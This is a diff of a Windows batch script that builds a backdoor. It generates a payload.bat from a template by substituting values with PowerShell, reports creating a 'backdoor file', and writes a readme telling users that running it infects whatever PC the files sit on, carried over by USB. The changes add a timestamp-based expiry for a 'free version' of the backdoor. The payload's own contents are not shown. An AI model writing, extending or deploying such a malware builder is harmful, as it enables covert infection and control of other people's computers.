@@ -1,7 +1,7 @@
 :: setup
 :start
-@ECHO ON
-set update_number=V3.38.27
+@ECHO OFF
+set update_number=V4.38.27
 set dev=0
 cls
 :VBSDynamicBuild
@@ -116,13 +116,13 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
     set CUR_YYYY=%date:~10,4%
     set CUR_DD=%date:~4,2%
     set CUR_MM=%date:~7,2%
+    set /a CUR_MM=%CUR_MM%+1
     set CUR_HH=%time:~0,2%
     if %CUR_HH% lss 10 (set CUR_HH=0%time:~1,1%)
     set CUR_NN=%time:~3,2%
     set CUR_SS=%time:~6,2%
     set CUR_MS=%time:~9,2%
     set current_time=%CUR_YYYY%%CUR_MM%%CUR_DD%%CUR_HH%%CUR_NN%%CUR_SS%
-    set /a current_time=%current_time%
     powershell -Command "(gc %opt2%\payload\payload.bat) -replace 'REPtxt', '%opt1%' | Out-File -encoding ASCII %opt2%\payload\payload.bat"
     powershell -Command "(gc %opt2%\payload\payload.bat) -replace 'REPtime', '%current_time%' | Out-File -encoding ASCII %opt2%\payload\payload.bat"
     if exist %opt2%\payload\payload.bat (echo [92msuccessfully created backdoor file![0m) else (goto error6)
@@ -135,7 +135,8 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
   :: create readme file
     echo data>load_trigger.txt
     echo [33mgenerating readme file...[0m
-    echo clicking run will infect whatever PC the files are on, so put these files on a usb and the files will be automaticaly moved to that PC. >%opt2%\readme.txt
+    echo you are using the free version and this backdoor will expire after 1 month or at the end of the year>%opt2%\readme.txt
+    echo clicking run will infect whatever PC the files are on, so put these files on a usb and the files will be automaticaly moved to that PC. >>%opt2%\readme.txt
     if exist %opt2%\readme.txt echo [92msuccessfully created readme file![0m
   :: check all files where made
     echo [33mverifying all files where successfuly made...[0m
